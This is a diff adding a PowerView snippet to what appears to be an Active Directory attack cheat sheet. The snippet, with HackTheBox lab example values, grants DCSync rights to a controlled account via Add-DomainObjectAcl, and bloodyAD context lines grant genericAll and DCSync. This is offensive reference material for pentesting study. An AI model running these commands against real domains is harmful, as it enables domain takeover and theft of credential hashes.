@@ -76,6 +76,17 @@ bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "
 bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$ControlledPrincipal"
 ```
 
+Using PowerView
+
+```powershell
+$SecPassword = ConvertTo-SecureString '<password_of_controlled_user_with_WriteDacl>' -AsPlainText -Force
+#$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<controlled_user>', $SecPassword)
+#$Cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity <user_that_is_gonna_receive_the_dcsync_acls> -Rights DCSync
+#Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity svc-alfresco -Rights DCSync
+```
+
 ### WriteOwner
 
     Abuse with bloodyAD
